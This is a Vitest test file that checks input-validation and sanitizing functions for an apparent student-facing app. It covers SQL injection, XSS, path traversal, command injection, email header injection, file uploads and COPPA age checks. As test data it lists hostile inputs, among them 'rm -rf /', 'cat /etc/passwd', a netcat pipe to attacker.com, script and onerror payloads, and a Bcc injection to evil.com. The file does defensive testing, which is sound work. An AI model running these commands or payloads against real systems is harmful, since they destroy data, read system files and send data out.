/**
 * Security Input Validation Integration Tests
 * Tests protection against common attack vectors
 */

import { describe, it, expect } from 'vitest';
import {
  preventSqlInjection,
  sanitizeHtml,
  preventPathTraversal,
  preventCommandInjection,
  preventEmailHeaderInjection,
  validateStudentMessage,
  validateFileUpload,
  validateCoppaAge,
} from '@/lib/security/input-validation';

describe('Security Input Validation', () => {
  describe('SQL Injection Prevention', () => {
    it('should detect SQL injection attempts', () => {
      const maliciousInputs = [
        "'; DROP TABLE User; --",
        '1 OR 1=1',
        "admin' --",
        'SELECT * FROM User',
        'UNION SELECT password FROM User',
      ];

      maliciousInputs.forEach((input) => {
        expect(preventSqlInjection(input)).toBe(false);
      });
    });

    it('should allow safe inputs', () => {
      const safeInputs = [
        'What is 2 + 2?',
        'Can you help me with fractions?',
        'My name is John',
      ];

      safeInputs.forEach((input) => {
        expect(preventSqlInjection(input)).toBe(true);
      });
    });
  });

  describe('XSS Prevention', () => {
    it('should remove script tags', () => {
      const input = '<script>alert("XSS")</script>';
      const sanitized = sanitizeHtml(input);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove iframe tags', () => {
      const input = '<iframe src="evil.com"></iframe>';
      const sanitized = sanitizeHtml(input);
      expect(sanitized).not.toContain('<iframe>');
    });

    it('should remove event handlers', () => {
      const input = '<img src="x" onerror="alert(1)">';
      const sanitized = sanitizeHtml(input);
      expect(sanitized).not.toContain('onerror');
    });

    it('should remove javascript: URLs', () => {
      const input = '<a href="javascript:alert(1)">Click</a>';
      const sanitized = sanitizeHtml(input);
      expect(sanitized).not.toContain('javascript:');
    });

    it('should allow safe HTML', () => {
      const input = '<p>Hello <strong>world</strong></p>';
      const sanitized = sanitizeHtml(input);
      expect(sanitized).toContain('<p>');
      expect(sanitized).toContain('<strong>');
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should detect path traversal attempts', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        '%2e%2e%2f',
        '%252e%252e/',
      ];

      maliciousPaths.forEach((path) => {
        expect(preventPathTraversal(path)).toBe(false);
      });
    });

    it('should allow safe paths', () => {
      const safePaths = [
        'document.pdf',
        'uploads/file.jpg',
        'user/profile/avatar.png',
      ];

      safePaths.forEach((path) => {
        expect(preventPathTraversal(path)).toBe(true);
      });
    });
  });

  describe('Command Injection Prevention', () => {
    it('should detect command injection attempts', () => {
      const maliciousInputs = [
        'test; rm -rf /',
        'test && cat /etc/passwd',
        'test | nc attacker.com 1234',
        'test `whoami`',
      ];

      maliciousInputs.forEach((input) => {
        expect(preventCommandInjection(input)).toBe(false);
      });
    });

    it('should allow safe inputs', () => {
      const safeInputs = [
        'What is the answer?',
        'Calculate 2+2',
        'Help me solve this problem',
      ];

      safeInputs.forEach((input) => {
        expect(preventCommandInjection(input)).toBe(true);
      });
    });
  });

  describe('Email Header Injection Prevention', () => {
    it('should detect email header injection', () => {
      const maliciousEmails = [
        'user@example.com\nBcc: attacker@evil.com',
        'user@example.com\r\nSubject: Spam',
      ];

      maliciousEmails.forEach((email) => {
        expect(preventEmailHeaderInjection(email)).toBe(false);
      });
    });

    it('should allow safe emails', () => {
      const safeEmails = [
        'user@example.com',
        'john.doe@school.edu',
        'parent+child@gmail.com',
      ];

      safeEmails.forEach((email) => {
        expect(preventEmailHeaderInjection(email)).toBe(true);
      });
    });
  });

  describe('Student Message Validation', () => {
    it('should validate safe messages', () => {
      const result = validateStudentMessage('Can you help me with math?');
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject empty messages', () => {
      const result = validateStudentMessage('');
      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Message cannot be empty');
    });

    it('should reject messages that are too long', () => {
      const longMessage = 'a'.repeat(5001);
      const result = validateStudentMessage(longMessage);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('maximum length'))).toBe(true);
    });

    it('should reject malicious SQL patterns', () => {
      const result = validateStudentMessage("'; DROP TABLE User; --");
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('SQL'))).toBe(true);
    });

    it('should sanitize HTML in messages', () => {
      const result = validateStudentMessage('<script>alert("XSS")</script>Hello');
      expect(result.sanitized).not.toContain('<script>');
      expect(result.sanitized).toContain('Hello');
    });
  });

  describe('File Upload Validation', () => {
    it('should allow valid file uploads', () => {
      const result = validateFileUpload('document.pdf', 1024 * 1024); // 1MB
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject files with path traversal', () => {
      const result = validateFileUpload('../../../etc/passwd.txt', 1024);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('invalid characters'))).toBe(true);
    });

    it('should reject files that are too large', () => {
      const result = validateFileUpload('large.pdf', 15 * 1024 * 1024); // 15MB
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('exceeds maximum'))).toBe(true);
    });

    it('should reject disallowed file types', () => {
      const result = validateFileUpload('malware.exe', 1024);
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('not allowed'))).toBe(true);
    });
  });

  describe('COPPA Age Validation', () => {
    it('should identify minors (under 13)', () => {
      const dob = new Date();
      dob.setFullYear(dob.getFullYear() - 10); // 10 years old

      const result = validateCoppaAge(dob);
      expect(result.isMinor).toBe(true);
      expect(result.age).toBe(10);
    });

    it('should identify non-minors (13 and over)', () => {
      const dob = new Date();
      dob.setFullYear(dob.getFullYear() - 15); // 15 years old

      const result = validateCoppaAge(dob);
      expect(result.isMinor).toBe(false);
      expect(result.age).toBe(15);
    });

    it('should handle birthday edge cases', () => {
      const dob = new Date();
      dob.setFullYear(dob.getFullYear() - 13);
      dob.setDate(dob.getDate() + 1); // Birthday tomorrow

      const result = validateCoppaAge(dob);
      expect(result.isMinor).toBe(true); // Still 12 until tomorrow
      expect(result.age).toBe(12);
    });
  });
});
